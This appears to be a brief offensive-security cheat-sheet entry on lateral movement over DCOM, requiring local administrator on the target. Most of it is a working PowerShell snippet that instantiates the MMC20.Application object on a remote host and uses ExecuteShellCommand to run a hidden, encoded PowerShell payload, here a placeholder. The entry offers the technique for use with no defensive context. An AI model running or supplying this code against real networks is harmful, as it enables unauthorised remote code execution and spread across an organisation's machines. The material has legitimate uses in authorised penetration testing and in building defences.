# DCOM (Distributed COM)

Lateral movement via the MMC Application Class. Requires local administrator on the target.

> DCOM operates over RPC on port 135.

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
$dcom.Document.ActiveView.ExecuteShellCommand("powershell", $null, "powershell -nop -w hidden -e <BASE64>", "7")
```
